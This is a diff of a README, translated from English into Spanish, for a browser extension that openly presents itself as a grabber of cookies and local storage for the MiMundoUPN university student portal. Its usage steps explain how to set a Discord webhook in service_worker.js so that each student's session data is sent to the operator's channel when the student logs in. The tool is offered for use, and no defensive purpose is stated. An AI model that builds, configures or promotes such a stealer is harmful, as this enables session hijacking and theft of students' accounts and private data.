@@ -3,20 +3,21 @@
 
 ## Description
 
-<p><b>UPN</b> local storage and cookies grabber extension</p>
-<p>By using a discord webhook, you can receive the student's data</p>
+<p>Extension encargada de obtener el <b>local storage</b> y <b>cookies</b> de la web <a href="https://mimundo.upn.edu.pe/">MiMundoUPN</a>(Universidad Privada del Norte)</p>
+
+<p>Utilizando <a href="https://support.discord.com/hc/es/articles/228383668-Introducci%C3%B3n-a-los-webhook">webhooks de discord</a> recibiras la informacion del alumno </p>
 
 ## Usage
 
-<p>Configuration: First you must enter the link of the discord webhook where the information will be sent</p>
+<p>Configuracion : Primero ingresa el link de tu webhook de discord en el archivo "service_worker.js" ya que ese sera el lugar donde se enviara la informacion</p>
 
 <p><img src="/img/code.png" alt="code"></p>
 
-<p>Example of creating a webhook in Discord: </p>
+<p>Ejemplo de crear un webhook en discord: </p>
 
 <p><img src="/img/webhook.png" alt="webhook"></p>
 
-<p>Once the extension is activated and configured, when a user login into <b>mimundo.upn.edu.pe</b>, the local storage and cookies will be sent to the webhook</p>
+<p>Una vez que hayas terminado lo anterior, cuando el alumno inicie sesion en <a href="https://mimundo.upn.edu.pe/">MiMundoUPN</a>, el <b>local storage</b> y <b>cookies</b> seran enviadas al canal de texto que escogiste:</p>
 
 <p><img src="/img/example_part1.png" alt="example_part1"></p>
 <p><img src="/img/example_part2.png" alt="example_part2"></p>
